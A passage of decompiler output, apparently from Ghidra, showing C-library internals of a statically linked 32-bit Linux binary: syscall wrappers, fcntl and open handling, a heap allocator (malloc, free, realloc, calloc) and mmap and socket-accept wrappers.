        iVar1 = FUN_08050f70();
        if (iVar1 == -0x16) {
          iVar1 = FUN_08050f70();
          if (-1 < iVar1) {
            FUN_08050f70();
          }
        }
        else {
          if (-1 < iVar1) {
            FUN_08050f70();
          }
          iVar1 = -0x16;
        }
      }
      else if (-1 < iVar1) {
        FUN_08050f70();
      }
      goto LAB_08050ee1;
    }
  }
  iVar1 = FUN_08050f70();
LAB_08050ee1:
  iVar1 = FUN_08050fe0(iVar1);
  return iVar1;
}



int FUN_08050d80(undefined4 param_1,int param_2,undefined4 param_3)

{
  int iVar1;
  int local_1c;
  int local_18;
  
  if (param_2 != 4) {
    if (param_2 == 0xe) {
      iVar1 = thunk_FUN_08050fbb(0xdd,param_1,0xe,param_3,0,0,0,&stack0x00000010);
      goto LAB_08050ee1;
    }
    if (param_2 == 9) {
      iVar1 = FUN_08050f70();
      if (iVar1 == -0x16) {
        iVar1 = FUN_08050f70();
        return iVar1;
      }
      if (iVar1 == 0) {
        if (local_1c != 2) {
          return local_18;
        }
        return -local_18;
      }
      goto LAB_08050ee1;
    }
    if (param_2 == 0x406) {
      iVar1 = FUN_08050f70();
      if (iVar1 == -0x16) {
        iVar1 = FUN_08050f70();
        if (iVar1 == -0x16) {
          iVar1 = FUN_08050f70();
          if (-1 < iVar1) {
            FUN_08050f70();
          }
        }
        else {
          if (-1 < iVar1) {
            FUN_08050f70();
          }
          iVar1 = -0x16;
        }
      }
      else if (-1 < iVar1) {
        FUN_08050f70();
      }
      goto LAB_08050ee1;
    }
  }
  iVar1 = FUN_08050f70();
LAB_08050ee1:
  iVar1 = FUN_08050fe0(iVar1);
  return iVar1;
}



void FUN_08050ef8(undefined4 param_1,uint param_2,undefined4 param_3)

{
  undefined *puVar1;
  int iVar2;
  undefined4 uVar3;
  int extraout_EDX;
  
  if ((param_2 & 0x40) == 0) {
    puVar1 = (undefined *)(param_2 & 0x410000);
    uVar3 = 0;
    if (puVar1 != (undefined *)0x410000) goto LAB_08050f24;
  }
  puVar1 = &stack0x00000010;
  uVar3 = param_3;
LAB_08050f24:
  iVar2 = thunk_FUN_08050fbb(5,param_1,param_2 | 0x8000,uVar3,0,0,0,puVar1);
  if ((-1 < iVar2) && ((param_2 & 0x80000) != 0)) {
    FUN_08050f70();
    iVar2 = extraout_EDX;
  }
  FUN_08050fe0(iVar2);
  return;
}



void __regparm3 FUN_08050f70(undefined4 param_1)

{
  FUN_08050f86(param_1);
  return;
}



undefined4 FUN_08050f86(undefined4 param_1)

{
  code *pcVar1;
  undefined4 uVar2;
  int unaff_retaddr;
  
  if (*(int *)(unaff_retaddr + 0x4934) != 0) {
    return param_1;
  }
  pcVar1 = (code *)swi(0x80);
  uVar2 = (*pcVar1)();
  return uVar2;
}



void __regparm1 FUN_08050fa1(undefined4 param_1_00,undefined4 *param_1)

{
  FUN_08050f70(*param_1,param_1_00);
  return;
}



void FUN_08050fbb(void)

{
  FUN_08050fa1(&stack0x00000018);
  return;
}



uint FUN_08050fe0(uint param_1)

{
  int *piVar1;
  
  if (0xfffff000 < param_1) {
    piVar1 = (int *)FUN_08050d40();
    *piVar1 = -param_1;
    param_1 = 0xffffffff;
  }
  return param_1;
}



void FUN_08051008(void)

{
  undefined4 uVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 auStack_20 [5];
  undefined *local_c;
  
  iVar3 = 1;
  puVar2 = (undefined4 *)&stack0x00000008;
  do {
    auStack_20[iVar3] = *puVar2;
    iVar3 = iVar3 + 1;
    puVar2 = puVar2 + 1;
  } while (iVar3 != 5);
  local_c = &stack0x00000018;
  uVar1 = FUN_08050f70(auStack_20[4]);
  FUN_08050fe0(uVar1);
  return;
}



undefined4 FUN_08051070(uint param_1,uint param_2)

{
  undefined4 uVar1;
  undefined4 *puVar2;
  
  if ((param_2 != 0) && ((uint)(0xffffffff / (ulonglong)param_2) < param_1)) {
    puVar2 = (undefined4 *)FUN_08050d40();
    *puVar2 = 0xc;
    return 0;
  }
  uVar1 = FUN_080521c0();
  return uVar1;
}



undefined4 __regparm3 FUN_080510b0(uint *param_1)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  bool bVar5;
  undefined *in_stack_ffffffc4;
  uint local_24;
  
  uVar4 = *param_1;
  do {
    while( true ) {
      do {
        if ((uVar4 & 1) != 0) {
          return 0;
        }
        uVar1 = (uVar4 >> 4) - 1;
        local_24 = uVar1;
        if ((0x20 < uVar1) && (local_24 = 0x3f, uVar1 < 0x1c01)) {
          local_24 = ((uint)(float)uVar1 >> 0x15) - 0x1f0;
        }
        iVar2 = local_24 * 0x10;
        uVar1 = uVar4;
        if (DAT_0805588c != 0) {
          LOCK();
          iVar3 = *(int *)(&DAT_08055148 + iVar2);
          *(int *)(&DAT_08055148 + iVar2) = 1;
          UNLOCK();
          if (iVar3 == 0) {
            uVar1 = *param_1;
          }
          else {
            do {
              in_stack_ffffffc4 = &DAT_08055148 + iVar2;
              FUN_08052f00(&DAT_08055148 + iVar2,&DAT_0805514c + iVar2,1,1);
              LOCK();
              iVar3 = *(int *)(&DAT_08055148 + iVar2);
              *(int *)(&DAT_08055148 + iVar2) = 1;
              UNLOCK();
            } while (iVar3 != 0);
            uVar1 = *param_1;
          }
        }
        iVar2 = local_24 * 0x10;
        if (*(int *)(&DAT_08055150 + iVar2) == 0) {
          *(undefined **)(&DAT_08055154 + iVar2) = &DAT_08055148 + iVar2;
          *(undefined **)(&DAT_08055150 + iVar2) = &DAT_08055148 + iVar2;
        }
        if (uVar1 == uVar4) {
          uVar4 = uVar4 & 0xfffffffe;
          iVar3 = *(int *)((int)param_1 + (0xc - uVar4));
          if (iVar3 == *(int *)((int)param_1 + (8 - uVar4))) {
            bVar5 = (local_24 & 0x20) == 0;
            LOCK();
            DAT_08055140 = DAT_08055140 & ~((uint)bVar5 << ((byte)local_24 & 0x1f));
            UNLOCK();
            LOCK();
            DAT_08055144 = DAT_08055144 & ~((uint)!bVar5 << ((byte)local_24 & 0x1f));
            UNLOCK();
            iVar3 = *(int *)((int)param_1 + (0xc - uVar4));
          }
          *(undefined4 *)(iVar3 + 8) = *(undefined4 *)((int)param_1 + (8 - uVar4));
          *(int *)(*(int *)((int)param_1 + (8 - uVar4)) + 0xc) = iVar3;
          uVar1 = *(uint *)((int)param_1 + (4 - uVar4));
          *(uint *)((int)param_1 + (4 - uVar4)) = uVar1 | 1;
          param_1 = (uint *)((int)param_1 + ((uVar1 & 0xfffffffe) - uVar4));
          *param_1 = *param_1 | 1;
          if (*(int *)(&DAT_08055148 + iVar2) != 0) {
            *(undefined4 *)(&DAT_08055148 + iVar2) = 0;
            LOCK();
            UNLOCK();
            if ((*(int *)(&DAT_0805514c + iVar2) != 0) &&
               (iVar2 = FUN_08050f70(in_stack_ffffffc4), iVar2 == -0x26)) {
              FUN_08050f70(in_stack_ffffffc4);
              return 1;
            }
          }
          return 1;
        }
        uVar4 = uVar1;
      } while (*(int *)(&DAT_08055148 + iVar2) == 0);
      *(undefined4 *)(&DAT_08055148 + iVar2) = 0;
      LOCK();
      UNLOCK();
      if (*(int *)(&DAT_0805514c + iVar2) != 0) break;
LAB_08051201:
      uVar4 = *param_1;
    }
    iVar2 = FUN_08050f70(in_stack_ffffffc4);
    if (iVar2 == -0x26) {
      FUN_08050f70(in_stack_ffffffc4);
      goto LAB_08051201;
    }
    uVar4 = *param_1;
  } while( true );
}



undefined4 __regparm3 FUN_08051310(int param_1)

{
  uint *puVar1;
  uint uVar2;
  undefined4 uVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  bool bVar8;
  undefined *in_stack_ffffffc4;
  uint local_28;
  
  uVar2 = *(uint *)(param_1 + 4);
  uVar7 = *(uint *)(param_1 + 4);
  while( true ) {
    if ((uVar2 & 1) != 0) {
      return 0;
    }
    uVar4 = (uVar2 >> 4) - 1;
    local_28 = uVar4;
    if ((0x20 < uVar4) && (local_28 = 0x3f, uVar4 < 0x1c01)) {
      local_28 = ((uint)(float)uVar4 >> 0x15) - 0x1f0;
    }
    iVar5 = local_28 * 0x10;
    uVar4 = uVar2;
    if (DAT_0805588c != 0) {
      LOCK();
      iVar6 = *(int *)(&DAT_08055148 + iVar5);
      *(int *)(&DAT_08055148 + iVar5) = 1;
      UNLOCK();
      if (iVar6 != 0) {
        do {
          in_stack_ffffffc4 = &DAT_08055148 + iVar5;
          FUN_08052f00(&DAT_08055148 + iVar5,&DAT_0805514c + iVar5,1,1);
          LOCK();
          iVar6 = *(int *)(&DAT_08055148 + iVar5);
          *(int *)(&DAT_08055148 + iVar5) = 1;
          UNLOCK();
        } while (iVar6 != 0);
      }
      uVar4 = *(uint *)(param_1 + 4);
      uVar7 = uVar4;
    }
    iVar5 = local_28 * 0x10;
    if (*(int *)(&DAT_08055150 + iVar5) == 0) {
      *(undefined **)(&DAT_08055154 + iVar5) = &DAT_08055148 + iVar5;
      *(undefined **)(&DAT_08055150 + iVar5) = &DAT_08055148 + iVar5;
    }
    if (uVar4 == uVar2) break;
    uVar2 = uVar4;
    if (*(int *)(&DAT_08055148 + iVar5) != 0) {
      *(undefined4 *)(&DAT_08055148 + iVar5) = 0;
      LOCK();
      UNLOCK();
      if ((*(int *)(&DAT_0805514c + iVar5) != 0) &&
         (iVar5 = FUN_08050f70(in_stack_ffffffc4), iVar5 == -0x26)) {
        FUN_08050f70(in_stack_ffffffc4);
      }
      uVar2 = *(uint *)(param_1 + 4);
      uVar7 = uVar2;
    }
  }
  iVar6 = *(int *)(param_1 + 0xc);
  if (iVar6 == *(int *)(param_1 + 8)) {
    bVar8 = (local_28 & 0x20) == 0;
    LOCK();
    DAT_08055140 = DAT_08055140 & ~((uint)bVar8 << ((byte)local_28 & 0x1f));
    UNLOCK();
    LOCK();
    DAT_08055144 = DAT_08055144 & ~((uint)!bVar8 << ((byte)local_28 & 0x1f));
    UNLOCK();
    uVar7 = *(uint *)(param_1 + 4);
    iVar6 = *(int *)(param_1 + 0xc);
  }
  uVar3 = *(undefined4 *)(param_1 + 8);
  *(uint *)(param_1 + 4) = uVar7 | 1;
  puVar1 = (uint *)((uVar7 & 0xfffffffe) + param_1);
  *puVar1 = *puVar1 | 1;
  *(undefined4 *)(iVar6 + 8) = uVar3;
  *(int *)(*(int *)(param_1 + 8) + 0xc) = iVar6;
  if (*(int *)(&DAT_08055148 + iVar5) != 0) {
    *(undefined4 *)(&DAT_08055148 + iVar5) = 0;
    LOCK();
    UNLOCK();
    if ((*(int *)(&DAT_0805514c + iVar5) != 0) &&
       (iVar5 = FUN_08050f70(in_stack_ffffffc4), iVar5 == -0x26)) {
      FUN_08050f70(in_stack_ffffffc4);
      return 1;
    }
  }
  return 1;
}



void FUN_08051550(int param_1)

{
  int iVar1;
  bool bVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  uint *puVar7;
  bool bVar8;
  undefined4 *in_stack_ffffffb4;
  uint *local_34;
  uint local_30;
  uint local_24;
  
  if (param_1 != 0) {
    puVar7 = (uint *)(param_1 + -8);
    uVar3 = *(uint *)(param_1 + -4);
    if ((uVar3 & 1) != 0) {
      uVar5 = uVar3 & 0xfffffffe;
      local_34 = (uint *)(uVar5 + (int)puVar7);
      if (uVar3 != *local_34) {
        do {
                    // WARNING: Do nothing block with infinite loop
        } while( true );
      }
      bVar2 = false;
      local_30 = uVar5;
      do {
        if ((*puVar7 & local_34[1] & 1) != 0) {
          puVar7[1] = local_30 | 1;
          *local_34 = local_30 | 1;
          uVar3 = (local_30 >> 4) - 1;
          local_24 = uVar3;
          if ((0x20 < uVar3) && (local_24 = 0x3f, uVar3 < 0x1c01)) {
            local_24 = ((uint)(float)uVar3 >> 0x15) - 0x1f0;
          }
          iVar6 = local_24 * 0x10;
          if (DAT_0805588c != 0) {
            LOCK();
            iVar1 = *(int *)(&DAT_08055148 + iVar6);
            *(int *)(&DAT_08055148 + iVar6) = 1;
            UNLOCK();
            if (iVar1 != 0) {
              do {
                in_stack_ffffffb4 = (undefined4 *)(&DAT_08055148 + iVar6);
                FUN_08052f00(&DAT_08055148 + iVar6,&DAT_0805514c + iVar6,1,1);
                LOCK();
                iVar1 = *(int *)(&DAT_08055148 + iVar6);
                *(int *)(&DAT_08055148 + iVar6) = 1;
                UNLOCK();
              } while (iVar1 != 0);
            }
          }
          iVar6 = local_24 * 0x10;
          if (*(int *)(&DAT_08055150 + iVar6) == 0) {
            *(undefined **)(&DAT_08055154 + iVar6) = &DAT_08055148 + iVar6;
            *(undefined **)(&DAT_08055150 + iVar6) = &DAT_08055148 + iVar6;
          }
          if (DAT_0805588c == 0) {
            uVar4 = *puVar7 & local_34[1];
            uVar3 = DAT_08055548;
          }
          else {
            while( true ) {
              uVar3 = DAT_08055548;
              LOCK();
              DAT_08055548 = 1;
              UNLOCK();
              if (uVar3 == 0) break;
              in_stack_ffffffb4 = &DAT_08055548;
              FUN_08052f00(&DAT_08055548,&DAT_0805554c,1,1);
            }
            uVar4 = *puVar7 & local_34[1];
            uVar3 = DAT_08055548;
          }
          DAT_08055548 = uVar4 & 1;
          if (DAT_08055548 != 0) {
            uVar5 = DAT_08055140 >> ((byte)local_24 & 0x1f) |
                    DAT_08055144 << 0x20 - ((byte)local_24 & 0x1f);
            if ((local_24 & 0x20) != 0) {
              uVar5 = DAT_08055144 >> ((byte)local_24 & 0x1f);
            }
            if ((uVar5 & 1) == 0) {
              bVar8 = (local_24 & 0x20) == 0;
              LOCK();
              DAT_08055140 = DAT_08055140 | (uint)bVar8 << ((byte)local_24 & 0x1f);
              UNLOCK();
              LOCK();
              DAT_08055144 = DAT_08055144 | (uint)!bVar8 << ((byte)local_24 & 0x1f);
              UNLOCK();
            }
            DAT_08055548 = uVar3;
            puVar7[1] = local_30;
            *local_34 = local_30;
            if (DAT_08055548 != 0) {
              DAT_08055548 = 0;
              LOCK();
              UNLOCK();
              if ((DAT_0805554c != 0) && (iVar6 = FUN_08050f70(in_stack_ffffffb4), iVar6 == -0x26))
              {
                FUN_08050f70(in_stack_ffffffb4);
              }
            }
            iVar6 = local_24 * 0x10;
            puVar7[2] = (uint)(&DAT_08055148 + iVar6);
            puVar7[3] = *(uint *)(&DAT_08055154 + iVar6);
            *(uint **)(&DAT_08055154 + iVar6) = puVar7;
            *(uint **)(puVar7[3] + 8) = puVar7;
            if (bVar2) {
              in_stack_ffffffb4 = (undefined4 *)((int)puVar7 + 0x100fU & 0xfffff000);
              FUN_08052234(in_stack_ffffffb4,
                           ((uint)(local_34 + -4) & 0xfffff000) - (int)in_stack_ffffffb4,4);
            }
            if (*(int *)(&DAT_08055148 + iVar6) == 0) {
              return;
            }
            *(undefined4 *)(&DAT_08055148 + iVar6) = 0;
            LOCK();
            UNLOCK();
            if (*(int *)(&DAT_0805514c + iVar6) == 0) {
              return;
            }
            iVar6 = FUN_08050f70(in_stack_ffffffb4);
            if (iVar6 != -0x26) {
              return;
            }
            FUN_08050f70(in_stack_ffffffb4);
            return;
          }
          if (uVar3 != 0) {
            LOCK();
            UNLOCK();
            uVar3 = DAT_08055548;
            if ((DAT_0805554c != 0) &&
               (iVar6 = FUN_08050f70(in_stack_ffffffb4), uVar3 = DAT_08055548, iVar6 == -0x26)) {
              FUN_08050f70();
              uVar3 = DAT_08055548;
            }
          }
          DAT_08055548 = uVar3;
          iVar6 = local_24 * 0x10;
          if (*(int *)(&DAT_08055148 + iVar6) != 0) {
            *(undefined4 *)(&DAT_08055148 + iVar6) = 0;
            LOCK();
            UNLOCK();
            if ((*(int *)(&DAT_0805514c + iVar6) != 0) &&
               (iVar6 = FUN_08050f70(in_stack_ffffffb4), iVar6 == -0x26)) {
              FUN_08050f70();
            }
          }
        }
        iVar6 = FUN_080510b0();
        if (iVar6 != 0) {
          puVar7 = (uint *)((int)puVar7 - (*puVar7 & 0xfffffffe));
          uVar3 = puVar7[1] & 0xfffffffe;
          local_30 = local_30 + uVar3;
          if ((0x28000 < uVar3 + uVar5) && (uVar3 < (uVar3 + uVar5 ^ uVar3))) {
            bVar2 = true;
          }
        }
        iVar6 = FUN_08051310();
        if (iVar6 != 0) {
          uVar3 = local_34[1] & 0xfffffffe;
          if ((0x28000 < uVar3 + uVar5) && (uVar3 < (uVar3 + uVar5 ^ uVar3))) {
            bVar2 = true;
          }
          local_30 = local_30 + uVar3;
          local_34 = (uint *)((int)local_34 + uVar3);
        }
      } while( true );
    }
    uVar5 = *(uint *)(param_1 + -8);
    if ((uVar5 & 1) != 0) {
      do {
                    // WARNING: Do nothing block with infinite loop
      } while( true );
    }
    FUN_0805233d((int)puVar7 - uVar5,(uVar3 & 0xfffffffe) + uVar5);
  }
  return;
}



uint * FUN_080519b0(int param_1)

{
  uint *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  bool bVar10;
  undefined *in_stack_ffffff94;
  uint *puVar11;
  uint *local_40;
  uint local_3c;
  uint uStack_38;
  uint local_28;
  uint local_1c;
  float local_18;
  
  if (param_1 - 1U < 0x7fffeff0) {
    local_28 = param_1 + 0x17U & 0xfffffff0;
    if (0x1c000 < local_28) {
      uVar8 = local_28 + 0x1007 & 0xfffff000;
      iVar6 = FUN_08052259(0,uVar8,3,0x22,0xffffffff,0,0);
      if (iVar6 == -1) {
        return (uint *)0x0;
      }
      *(uint *)(iVar6 + 0xc) = uVar8 - 8;
      *(undefined4 *)(iVar6 + 8) = 8;
      return (uint *)(iVar6 + 0x10);
    }
    local_3c = (param_1 + 0x17U >> 4) - 1;
    if (0x20 < local_3c) {
      local_18 = (float)local_3c;
      local_3c = ((int)local_18 + 0x1fffffU >> 0x15) - 0x1f0;
    }
  }
  else {
    local_28 = 0x10;
    local_3c = 0;
    if (param_1 != 0) {
      puVar4 = (undefined4 *)FUN_08050d40();
      *puVar4 = 0xc;
      return (uint *)0x0;
    }
  }
  uVar2 = -1 << ((byte)local_3c & 0x1f);
  uVar8 = 0xffffffff;
  uVar3 = uVar2;
  if ((local_3c & 0x20) != 0) {
    uVar3 = 0;
    uVar8 = uVar2;
  }
  do {
    uVar7 = uVar8 & DAT_08055144;
    uVar2 = uVar3 & DAT_08055140;
    if ((uVar7 | uVar2) == 0) {
      local_1c = local_28 + 0x10;
      if (DAT_0805588c != 0) {
        while( true ) {
          iVar6 = DAT_08055124;
          LOCK();
          DAT_08055124 = 1;
          UNLOCK();
          if (iVar6 == 0) break;
          FUN_08052f00(&DAT_08055124,&DAT_08055128,1,1);
        }
      }
      puVar11 = &local_1c;
      iVar6 = FUN_08053f50(puVar11);
      if (iVar6 == 0) {
        if (DAT_08055124 != 0) {
          LOCK();
          UNLOCK();
          DAT_08055124 = iVar6;
          if ((DAT_08055128 != 0) && (iVar6 = FUN_08050f70(puVar11), iVar6 == -0x26)) {
            FUN_08050f70(puVar11);
            return (uint *)0x0;
          }
        }
        return (uint *)0x0;
      }
      iVar5 = iVar6;
      if (iVar6 != DAT_08055120) {
        iVar5 = iVar6 + 0x10;
        local_1c = local_1c - 0x10;
        *(undefined4 *)(iVar6 + 8) = 1;
      }
      puVar1 = (uint *)(iVar5 + -8);
      DAT_08055120 = iVar5 + local_1c;
      *(undefined4 *)(DAT_08055120 + -4) = 1;
      *(uint *)(DAT_08055120 + -8) = local_1c | 1;
      *(uint *)(iVar5 + -4) = local_1c | 1;
      if (DAT_08055124 != 0) {
        DAT_08055124 = 0;
        LOCK();
        UNLOCK();
        if ((DAT_08055128 != 0) && (iVar6 = FUN_08050f70(puVar11), iVar6 == -0x26)) {
          FUN_08050f70();
        }
      }
      iVar6 = FUN_080510b0();
      local_40 = puVar1;
      if (iVar6 != 0) {
        uVar8 = *(uint *)(iVar5 + -4);
        local_40 = (uint *)((int)puVar1 - (*puVar1 & 0xfffffffe));
        uVar3 = (local_40[1] & 0xfffffffe) + uVar8;
        local_40[1] = uVar3;
        *(uint *)((int)puVar1 + (uVar8 & 0xfffffffe)) = uVar3;
      }
LAB_08051bea:
      uVar8 = local_40[1] & 0xfffffffe;
      if (local_28 < uVar8 - 0x10) {
        puVar11 = (uint *)((int)local_40 + local_28);
        *puVar11 = local_28 | 1;
        uVar3 = uVar8 - local_28 | 1;
        puVar11[1] = uVar3;
        *(uint *)((int)local_40 + uVar8) = uVar3;
        local_40[1] = local_28 | 1;
        FUN_08051550(puVar11 + 2);
      }
      return local_40 + 2;
    }
    uVar9 = 0;
    if (uVar2 != 0) {
      for (; (uVar2 >> uVar9 & 1) == 0; uVar9 = uVar9 + 1) {
      }
    }
    if (uVar2 == 0) {
      iVar6 = 0;
      if (uVar7 != 0) {
        for (; (uVar7 >> iVar6 & 1) == 0; iVar6 = iVar6 + 1) {
        }
      }
      uVar9 = iVar6 + 0x20;
    }
    iVar6 = uVar9 * 0x10;
    if (DAT_0805588c != 0) {
      LOCK();
      iVar5 = *(int *)(&DAT_08055148 + iVar6);
      *(int *)(&DAT_08055148 + iVar6) = 1;
      UNLOCK();
      if (iVar5 != 0) {
        do {
          in_stack_ffffff94 = &DAT_08055148 + iVar6;
          FUN_08052f00(&DAT_08055148 + iVar6,&DAT_0805514c + iVar6,1,1);
          LOCK();
          iVar5 = *(int *)(&DAT_08055148 + iVar6);
          *(int *)(&DAT_08055148 + iVar6) = 1;
          UNLOCK();
        } while (iVar5 != 0);
      }
    }
    iVar6 = uVar9 * 0x10;
    local_40 = *(uint **)(&DAT_08055150 + iVar6);
    if (local_40 == (uint *)0x0) {
      *(undefined **)(&DAT_08055154 + iVar6) = &DAT_08055148 + iVar6;
      *(undefined **)(&DAT_08055150 + iVar6) = &DAT_08055148 + iVar6;
    }
    else if (local_40 != (uint *)(&DAT_08055148 + iVar6)) {
      if ((int)uVar9 < 0x28) {
LAB_08051cfe:
        uVar8 = local_40[3];
        if (uVar8 == local_40[2]) {
          bVar10 = (uVar9 & 0x20) == 0;
          LOCK();
          DAT_08055140 = DAT_08055140 & ~((uint)bVar10 << ((byte)uVar9 & 0x1f));
          UNLOCK();
          LOCK();
          DAT_08055144 = DAT_08055144 & ~((uint)!bVar10 << ((byte)uVar9 & 0x1f));
          UNLOCK();
          uVar8 = local_40[3];
        }
        *(uint *)(uVar8 + 8) = local_40[2];
        *(uint *)(local_40[2] + 0xc) = uVar8;
        uVar8 = local_40[1];
        local_40[1] = uVar8 | 1;
        puVar11 = (uint *)((uVar8 & 0xfffffffe) + (int)local_40);
        *puVar11 = *puVar11 | 1;
      }
      else {
        if ((int)uVar9 < (int)(local_3c + 3)) {
          if (uVar9 == 0x3f) {
            uStack_38 = local_40[1] & 0xfffffffe;
            uVar8 = uStack_38 - local_28;
            if (0x1c000 < uVar8) goto LAB_08051cc5;
          }
          goto LAB_08051cfe;
        }
        uStack_38 = local_40[1] & 0xfffffffe;
        uVar8 = uStack_38 - local_28;
LAB_08051cc5:
        uVar3 = (uVar8 >> 4) - 1;
        if (uVar3 < 0x21) goto LAB_08051cfe;
        uVar2 = 0x3f;
        if (uVar3 < 0x1c01) {
          uVar2 = ((uint)(float)uVar3 >> 0x15) - 0x1f0;
        }
        if (uVar2 != uVar9) goto LAB_08051cfe;
        uVar3 = local_40[3];
        puVar11 = (uint *)((int)local_40 + local_28);
        uVar2 = local_40[2];
        puVar11[1] = uVar8;
        puVar11[3] = uVar3;
        puVar11[2] = uVar2;
        *(uint **)(uVar3 + 8) = puVar11;
        *(uint **)(puVar11[2] + 0xc) = puVar11;
        *puVar11 = local_28 | 1;
        local_40[1] = local_28 | 1;
        *(uint *)(uStack_38 + (int)local_40) = uVar8;
      }
      iVar6 = uVar9 * 0x10;
      if (*(int *)(&DAT_08055148 + iVar6) != 0) {
        *(undefined4 *)(&DAT_08055148 + iVar6) = 0;
        LOCK();
        UNLOCK();
        if ((*(int *)(&DAT_0805514c + iVar6) != 0) &&
           (iVar6 = FUN_08050f70(in_stack_ffffff94), iVar6 == -0x26)) {
          FUN_08050f70(in_stack_ffffff94);
        }
      }
      goto LAB_08051bea;
    }
    iVar6 = uVar9 * 0x10;
    if (*(int *)(&DAT_08055148 + iVar6) != 0) {
      *(undefined4 *)(&DAT_08055148 + iVar6) = 0;
      LOCK();
      UNLOCK();
      if ((*(int *)(&DAT_0805514c + iVar6) != 0) &&
         (iVar6 = FUN_08050f70(in_stack_ffffff94), iVar6 == -0x26)) {
        FUN_08050f70(in_stack_ffffff94);
      }
    }
  } while( true );
}



int FUN_08051f70(int param_1,int param_2)

{
  uint *puVar1;
  undefined4 *puVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  int iVar8;
  uint local_14;
  
  if (param_1 == 0) {
    iVar8 = FUN_080519b0();
    return iVar8;
  }
  if (param_2 - 1U < 0x7fffeff0) {
    local_14 = param_2 + 0x17U & 0xfffffff0;
  }
  else {
    local_14 = 0x10;
    if (param_2 != 0) {
      puVar2 = (undefined4 *)FUN_08050d40();
      *puVar2 = 0xc;
      return 0;
    }
  }
  iVar8 = param_1 + -8;
  uVar5 = *(uint *)(param_1 + -4);
  uVar6 = uVar5 & 0xfffffffe;
  if ((uVar5 & 1) == 0) {
    uVar5 = *(uint *)(param_1 + -8);
    if ((uVar5 & 1) != 0) {
      do {
                    // WARNING: Do nothing block with infinite loop
      } while( true );
    }
    if ((local_14 + uVar5 < 0x1000) && (iVar3 = FUN_080519b0(local_14), iVar3 != 0)) {
      FUN_08052d4c(iVar3,param_1,local_14 - 8);
      FUN_08051550(param_1);
      return iVar3;
    }
    uVar6 = uVar6 + uVar5;
    uVar7 = local_14 + uVar5 + 0xfff & 0xfffff000;
    if (uVar6 == uVar7) {
      return param_1;
    }
    iVar8 = FUN_080522fc(iVar8 - uVar5,uVar6,uVar7,1);
    if (iVar8 == -1) {
      if (uVar7 < uVar6) {
        return param_1;
      }
      return 0;
    }
    *(uint *)(uVar5 + iVar8 + 4) = uVar7 - uVar5;
    return uVar5 + iVar8 + 8;
  }
  puVar1 = (uint *)(iVar8 + uVar6);
  if (uVar5 != *puVar1) {
    do {
                    // WARNING: Do nothing block with infinite loop
    } while( true );
  }
  if (uVar6 < local_14) {
    iVar3 = FUN_08051310();
    if (iVar3 == 0) {
      *(uint *)(param_1 + -4) = uVar6 | 1;
      *puVar1 = uVar6 | 1;
    }
    else {
      uVar7 = puVar1[1];
      uVar5 = (uVar7 & 0xfffffffe) + uVar6;
      uVar4 = uVar5 | 1;
      *(uint *)(param_1 + -4) = uVar4;
      *(uint *)((int)puVar1 + (uVar7 & 0xfffffffe)) = uVar4;
      if (local_14 <= uVar5) goto LAB_0805206c;
    }
    iVar3 = FUN_080519b0(local_14 - 8);
    if (iVar3 != 0) {
      FUN_08052d4c(iVar3,param_1,uVar6 - 8);
      FUN_08051550(param_1);
    }
  }
  else {
    *(uint *)(param_1 + -4) = uVar6 | 1;
    *puVar1 = uVar6 | 1;
LAB_0805206c:
    uVar6 = *(uint *)(param_1 + -4) & 0xfffffffe;
    iVar3 = param_1;
    if (local_14 < uVar6 - 0x10) {
      puVar1 = (uint *)(iVar8 + local_14);
      *puVar1 = local_14 | 1;
      uVar5 = uVar6 - local_14 | 1;
      puVar1[1] = uVar5;
      *(uint *)(iVar8 + uVar6) = uVar5;
      *(uint *)(param_1 + -4) = local_14 | 1;
      FUN_08051550(puVar1 + 2);
    }
  }
  return iVar3;
}



void FUN_080521c0(int param_1)

{
  int *piVar1;
  uint uVar2;
  
  piVar1 = (int *)FUN_080519b0(param_1);
  if (((piVar1 != (int *)0x0) && ((*(byte *)(piVar1 + -1) & 1) != 0)) &&
     (uVar2 = param_1 + 3U >> 2, uVar2 != 0)) {
    while( true ) {
      if (*piVar1 != 0) {
        *piVar1 = 0;
      }
      uVar2 = uVar2 - 1;
      if (uVar2 == 0) break;
      piVar1 = piVar1 + 1;
    }
  }
  return;
}



void FUN_08052204(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08050f70();
  FUN_08050fe0(uVar1);
  return;
}



void FUN_08052234(void)

{
  FUN_08050f70();
  FUN_08050fe0();
  return;
}



void FUN_08052258(void)

{
  return;
}



undefined4
FUN_08052259(undefined4 param_1,uint param_2,undefined4 param_3,byte param_4,undefined4 param_5,
            uint param_6,uint param_7)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  undefined4 local_18;
  uint local_14;
  
  if ((param_7 & 0xfffff000 | param_6 & 0xfff) == 0) {
    if (param_2 < 0x7fffffff) {
      if ((param_4 & 0x10) != 0) {
        FUN_08052258();
      }
      local_14 = param_6 >> 0xc | param_7 << 0x14;
      local_18 = param_5;
      uVar2 = FUN_08050fa1(&local_18);
      uVar2 = FUN_08050fe0(uVar2);
      return uVar2;
    }
    puVar1 = (undefined4 *)FUN_08050d40();
    *puVar1 = 0xc;
  }
  else {
    puVar1 = (undefined4 *)FUN_08050d40();
    *puVar1 = 0x16;
  }
  return 0xffffffff;
}



void FUN_080522fc(void)

{
  undefined4 uVar1;
  undefined4 param_5;
  
  uVar1 = FUN_08050f70(param_5);
  FUN_08050fe0(uVar1);
  return;
}



void FUN_0805233d(void)

{
  FUN_08052258();
  FUN_08050f70();
  FUN_08050fe0();
  return;
}



void __regparm2
FUN_0805236c(undefined4 param_1_00,undefined4 param_2_00,undefined4 param_1,undefined4 param_2,
            undefined4 param_3)

{
  undefined4 uVar1;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  undefined4 local_4;
  
  local_c = 0;
  local_8 = 0;
  local_4 = 0;
  local_18 = param_1;
  local_14 = param_2;
  local_10 = param_3;
  uVar1 = thunk_FUN_08050fbb(0x66,5,&local_18,0,0,0,0,param_2_00);
  FUN_08050fe0(uVar1);
  return;
}



void FUN_080523c4(void)

{
